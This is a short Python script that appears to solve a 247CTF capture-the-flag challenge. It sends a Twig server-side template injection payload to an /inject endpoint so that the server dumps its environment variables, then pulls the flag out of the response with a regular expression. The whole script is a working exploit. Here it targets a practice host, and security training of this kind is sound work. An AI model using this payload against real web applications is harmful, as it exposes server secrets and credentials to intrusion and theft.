import requests
import re

url = "https://139be4fb3c24a9fe.247ctf.com/"

res = requests.get(f'{url}/inject', params={
    'inject': '{{app.request.server.all|json_encode}}'
})

flag = re.findall(r'(247CTF{.+?})', res.text)[0]
print("Flag:", flag)